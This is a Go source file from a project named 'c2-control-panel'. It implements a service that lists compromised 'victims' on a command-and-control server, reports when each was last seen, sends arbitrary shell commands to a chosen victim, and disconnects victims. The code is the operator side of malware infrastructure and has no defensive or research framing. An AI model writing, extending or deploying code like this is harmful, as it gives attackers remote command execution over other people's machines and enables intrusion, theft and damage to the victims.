package services

import (
	"c2-control-panel/c2server"
	"c2-control-panel/models"
)

type VictimsService struct {
	c2 *c2server.Server
}

func NewVictimsService(c2 *c2server.Server) *VictimsService {
	return &VictimsService{c2: c2}
}

func (s *VictimsService) GetAll() []models.Victim {
	sessions := s.c2.GetVictims()
	victims := make([]models.Victim, len(sessions))
	for i, v := range sessions {
		victims[i] = models.Victim{
			ID:       v.ID,
			Info:     v.Info,
			LastSeen: v.LastSeen,
		}
	}
	return victims
}

func (s *VictimsService) GetByID(id string) (*models.Victim, error) {
	for _, v := range s.c2.GetVictims() {
		if v.ID == id {
			victim := models.Victim{ID: v.ID, Info: v.Info, LastSeen: v.LastSeen}
			return &victim, nil
		}
	}
	return nil, c2server.ErrVictimNotFound
}

func (s *VictimsService) SendCommand(id string, command string) error {
	return s.c2.SendCommand(id, c2server.CmdShell, []byte(command))
}

func (s *VictimsService) Disconnect(id string) error {
	return s.c2.Disconnect(id)
}
